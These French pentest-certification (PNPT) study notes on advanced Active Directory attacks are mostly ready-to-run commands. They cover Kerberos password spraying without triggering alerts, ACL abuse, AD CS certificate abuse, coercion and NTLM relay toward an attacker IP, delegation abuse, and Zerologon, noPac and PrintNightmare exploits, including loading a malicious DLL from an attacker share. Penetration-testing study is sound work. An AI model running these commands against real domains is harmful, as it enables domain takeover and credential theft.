---
title: "Active Directory - Attaques avancées (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, active-directory, kerberos, adcs, pnpt]
date: "2026-05-18"
---

# Active Directory — Attaques avancées

Suite de `09-active-directory`. On y trouve les attaques modernes qui distinguent un pentesteur réel d'un script kiddie : ACL abuse, AD CS (ESC1–ESC8), coercion, delegation, et les CVE qu'il faut connaître par cœur. Ces techniques sont aussi celles qui marchent encore en 2026 sur la majorité des environnements AD, parce qu'elles exploitent la complexité de l'AD plus que des bugs corrigeables.

## Où chaque technique s'insère

```
   Chemin classique d'une attaque AD avancée

   Énumération
        │
        ▼
   ┌────────────────────────┬────────────────────┐
   ▼                        ▼                    ▼
   ACL abuse           AD CS (ESC1-8)       Coercion + relay
   (GenericWrite,      (template vuln,      (PetitPotam,
    GenericAll,        SAN supply,          PrinterBug,
    WriteDACL...)      web enrollment...)    DFSCoerce)
        │                        │                    │
        ▼                        ▼                    ▼
   Compromis user/      Compromis user/      Compromis DC$
   groupe ciblé         compte arbitraire    (TGT du DC)
        │                        │                    │
        └────────────┬───────────┴────────────────────┘
                     ▼
              Delegation abuse
              (Unconstrained, Constrained, RBCD)
                     │
                     ▼
              DCSync / Golden Ticket
              (= Domain Admin permanent)
```

## kerbrute — énumération et spraying silencieux

Kerbrute utilise les requêtes Kerberos pré-auth, donc **pas d'event 4625** côté DC (contrairement à un login SMB ou WinRM). C'est l'outil de référence pour spray sans alerte.

```bash
# Énumération d'utilisateurs valides
kerbrute userenum -d domaine.com --dc DC_IP users.txt

# Password spraying — UN mot de passe sur TOUS les users
kerbrute passwordspray -d domaine.com --dc DC_IP users.txt 'Spring2026!'

# Brute force ciblé sur un seul user
kerbrute bruteuser -d domaine.com --dc DC_IP wordlist.txt user
```

**Avant tout spray** : `net accounts /domain` pour connaître la lockout policy. Spray plus rapide que la policy = comptes bloqués → on grille la position.

## PowerView — énumération depuis Windows

L'équivalent BloodHound côté ligne de commande. Indispensable quand on n'a pas accès à un BloodHound GUI.

```powershell
. .\PowerView.ps1

# Domaine et structure
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy

# Utilisateurs avec angle d'attaque
Get-NetUser -SPN                           # Kerberoastables
Get-NetUser -PreauthNotRequired            # AS-REP roastables

# Groupes
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetLocalGroupMember -ComputerName SRV01

# Où l'utilisateur courant est admin local
Find-LocalAdminAccess
Find-DomainUserLocation -UserName user

# GPOs (souvent passwords en clair dedans, Group Policy Preferences)
Get-NetGPO | select displayname, gpcfilesyspath

# Trusts
Get-NetDomainTrust
Get-NetForestTrust

# Sessions actives (mouvement latéral)
Get-NetSession -ComputerName SRV01
Invoke-UserHunter
```

## Rubeus — Kerberos couteau-suisse

```powershell
# Demander un TGT (overpass-the-hash possible avec /rc4)
Rubeus.exe asktgt /user:user /password:pass /domain:cible.com /dc:DC_IP
Rubeus.exe asktgt /user:user /rc4:NTHASH /domain:cible.com /ptt

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc_account /simple

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep.txt

# Pass-the-Ticket
Rubeus.exe ptt /ticket:ticket.kirbi

# Lister les tickets en mémoire
Rubeus.exe triage
Rubeus.exe klist

# S4U (constrained delegation — voir plus bas)
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator \
              /msdsspn:cifs/target.cible.com /ptt
```

## ACL Abuse — exploiter les permissions AD

BloodHound révèle les permissions abusables. Les plus fréquentes :

### GenericAll / GenericWrite sur un user

```powershell
# Option 1 : forcer un changement de mot de passe
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewP@ss1' -AsPlainText -Force)

# Option 2 : "Targeted Kerberoasting" — set un SPN puis Kerberoast
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/spn'}
Rubeus.exe kerberoast /user:victim
Set-DomainObject -Identity victim -Clear serviceprincipalname    # nettoyer

# Depuis Linux
targetedKerberoast.py -d cible.com -u user -p pass --request-user victim
```

### GenericAll / GenericWrite sur un groupe

```powershell
Add-DomainGroupMember -Identity 'Helpdesk' -Members 'attacker' -Verbose
net group "Helpdesk" attacker /add /domain
```

### WriteDACL sur un objet

```powershell
# S'octroyer le droit de DCSync (WriteDACL sur le domaine)
Add-DomainObjectAcl -TargetIdentity 'DC=cible,DC=com' -PrincipalIdentity attacker -Rights DCSync
secretsdump.py cible.com/attacker:pass@DC_IP
```

### ForceChangePassword

```bash
net rpc password "victim" "NewP@ss1" -U "cible.com"/"attacker"%"pass" -S DC_IP
```

### Shadow Credentials (msDS-KeyCredentialLink)

Si on a GenericWrite/GenericAll sur un compte, on peut y attacher une clé publique et s'authentifier en tant que ce compte via PKINIT (Kerberos + certificats).

```bash
# Linux
pywhisker.py -d cible.com -u attacker -p pass --target victim --action add
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass PASS cible.com/victim victim.ccache
export KRB5CCNAME=victim.ccache
secretsdump.py -k -no-pass victim@DC_IP
```

```powershell
# Windows
Whisker.exe add /target:victim
Rubeus.exe asktgt /user:victim /certificate:CERT_BASE64 /password:CERT_PASS \
                  /domain:cible.com /dc:DC_IP /getcredentials /show
```

## AD Certificate Services — ESC1 à ESC8

Très fréquent, souvent oublié à l'audit. AD CS = autorité de certification de l'AD. Si un template est mal configuré, on peut demander un certificat au nom d'un autre user (souvent un admin).

```bash
# Énumérer les templates vulnérables
certipy find -u user@cible.com -p pass -dc-ip DC_IP -vulnerable -stdout
```

```
ESC1 : ENROLLEE_SUPPLIES_SUBJECT activé sur un template autorisé en login
       → on demande un cert avec UPN=admin → on s'auth comme admin

ESC2 : Template "Any Purpose" → certificat utilisable pour tout, y compris
       impersonation côté serveur

ESC3 : Enrollment Agent template → on enroll au nom d'un autre

ESC4 : ACL faible sur un template → on le modifie pour le rendre ESC1

ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 activé côté CA → permet SAN supply
       même sur templates non-ESC1

ESC7 : ACL faible sur la CA → ajouter une approbation auto

ESC8 : Web Enrollment (HTTP) sans signature → NTLM relay vers /certsrv/
```

```bash
# ESC1 — exploitation
certipy req -u user@cible.com -p pass -ca CA_NAME -template TemplateName \
            -upn administrator@cible.com
certipy auth -pfx administrator.pfx

# ESC4 — modifier le template puis exploiter comme ESC1
certipy template -u user@cible.com -p pass -template TemplateName -save-old

# ESC8 — NTLM relay vers Web Enrollment
certipy relay -ca CA_HOST
# En parallèle, déclencher une coercion (PetitPotam) vers attaquant
```

```powershell
# Certify (Windows)
Certify.exe find /vulnerable
Certify.exe request /ca:DC.cible.com\CA-NAME /template:VulnTemplate /altname:Administrator
```

## Coercion attacks

Forcer un compte machine (souvent DC$) à s'authentifier vers nous → on relaie cette auth vers une cible (LDAP, AD CS, SMB).

```
   Attaquant                    Victime (DC$)              Cible relay
       │                              │                         │
       │ PetitPotam (RPC EFS) ───►    │                         │
       │                              │                         │
       │ ◄── auth NTLM (DC$) ─────────│                         │
       │                              │                         │
       │ ──── relai de l'auth ──────────────────────────────►   │
       │                                                        │
       │  ◄────────────── ressource accessible comme DC$ ───────│
```

### PetitPotam (MS-EFSRPC)

```bash
# Coerce le DC à se connecter à notre IP
PetitPotam.py -u user -p pass ATTACKER_IP DC_IP
PetitPotam.py ATTACKER_IP DC_IP                # sans creds (dépend du patch)

# Combiné avec relay vers AD CS Web Enrollment (= ESC8)
ntlmrelayx.py -t http://ADCS_HOST/certsrv/certfnsh.asp --adcs --template DomainController
PetitPotam.py ATTACKER_IP DC_IP
```

### PrinterBug (MS-RPRN)

```bash
printerbug.py cible.com/user:pass@VICTIM_IP ATTACKER_IP
SpoolSample.exe VICTIM_IP ATTACKER_IP
```

### DFSCoerce / ShadowCoerce

```bash
dfscoerce.py -u user -p pass ATTACKER_IP DC_IP
shadowcoerce.py -u user -p pass ATTACKER_IP DC_IP
```

## Delegation attacks

### Unconstrained Delegation

Si on compromet une machine en Unconstrained Delegation, tout TGT envoyé à cette machine est mis en cache.

```powershell
Get-DomainComputer -Unconstrained

# Sur la machine compromise, surveiller les TGT entrants
Rubeus.exe monitor /interval:5

# Forcer le DC à se connecter (PrinterBug) → cache son TGT chez nous
SpoolSample.exe DC_IP COMPROMISED_HOST_IP
# Puis DCSync avec le TGT du DC$
```

### Constrained Delegation (S4U2Self + S4U2Proxy)

Compte avec `msDS-AllowedToDelegateTo` configuré.

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Avec le hash du compte, demander un ticket en tant qu'admin
Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator \
              /msdsspn:cifs/target.cible.com /ptt
dir \\target.cible.com\C$
```

### Resource-Based Constrained Delegation (RBCD)

Si on a GenericWrite/GenericAll sur un objet machine cible, on peut configurer un compte qu'on contrôle pour déléguer vers cette cible.

```bash
# 1. Créer un compte machine (MachineAccountQuota=10 par défaut)
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'P@ss123' cible.com/user:pass

# 2. Configurer RBCD sur la cible
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action 'write' cible.com/user:pass

# 3. S4U pour obtenir un ticket admin sur la cible
getST.py -spn cifs/target.cible.com -impersonate Administrator -dc-ip DC_IP \
         'cible.com/ATTACKER$:P@ss123'
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.cible.com
```

## CVE incontournables

### Zerologon (CVE-2020-1472)

Reset du mot de passe du compte machine DC à vide. À tester sur tout DC non patché.

```bash
# Test de vulnérabilité
zerologon_tester.py DC_NAME DC_IP

# Exploitation : reset le hash du DC$
zerologon_exploit.py DC_NAME DC_IP

# DCSync avec DC$ vide
secretsdump.py -no-pass -just-dc 'cible.com/DC$@DC_IP'

# CRUCIAL : restaurer le hash original ensuite (sinon le DC casse)
reinstall_original_pw.py DC_NAME DC_IP ORIGINAL_HASH
```

### noPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)

```bash
noPac.py -dc-ip DC_IP -dc-host DC_NAME cible.com/user:pass --impersonate Administrator -shell
sam-the-admin.py 'cible.com/user:pass' -dc-ip DC_IP --impersonate Administrator -shell
```

### PrintNightmare (CVE-2021-34527)

```bash
CVE-2021-1675.py cible.com/user:pass@TARGET '\\ATTACKER\share\evil.dll'
```

## MSSQL — vecteur fréquent en interne

```bash
mssqlclient.py cible.com/user:pass@MSSQL_IP -windows-auth
crackmapexec mssql IP -u user -p pass

# Une fois connecté
> enable_xp_cmdshell
> xp_cmdshell whoami

# Impersonation et liens
> enum_impersonate
> enum_links
> use_link LINKED_SERVER

# Capturer le hash du compte de service via xp_dirtree
> xp_dirtree \\ATTACKER_IP\share
# Et lancer Responder en parallèle → NetNTLMv2 du service account
```

## LAPS

LAPS stocke les mots de passe admin local dans AD. Lisibles par certains groupes (Helpdesk souvent).

```bash
crackmapexec ldap DC_IP -u user -p pass --kdcHost DC_IP -M laps
```

```powershell
Get-DomainObject -Identity 'CN=PC01,...' -Properties ms-Mcs-AdmPwd
```

## Pièges courants

- **PetitPotam patché partiellement** : la version sans creds ne marche pas sur les Windows récents. Toujours avoir des creds dans la poche.
- **Zerologon casse le DC si pas restauré** : faire `reinstall_original_pw.py` JUSTE après avoir terminé l'exploitation, sinon le DC perd son canal sécurisé et l'AD plante.
- **MachineAccountQuota peut être à 0** : RBCD impossible si l'admin a verrouillé la création de comptes machine. Vérifier `Get-DomainPolicy -Policy Domain | select -ExpandProperty SystemAccess`.
- **ESC1 nécessite ENROLLEE_SUPPLIES_SUBJECT** : sans, on ne peut pas spécifier le UPN cible. ESC4 permet de l'activer si on a l'ACL.
- **Coercion + relay sur LDAPS nécessite SSL** : ntlmrelayx `--no-smb-server` + `--no-http-server` selon le service utilisé pour la coercion.
- **Unconstrained delegation est rare aujourd'hui** : par défaut désactivé sur les comptes machines depuis Server 2012. Mais on en trouve sur des comptes historiques.
- **LAPS retourne base64 selon la version** : LAPSv2 (Windows LAPS) stocke chiffré et nécessite des droits spécifiques. Vérifier l'attribut `msLAPS-Password` (v2) vs `ms-Mcs-AdmPwd` (v1).
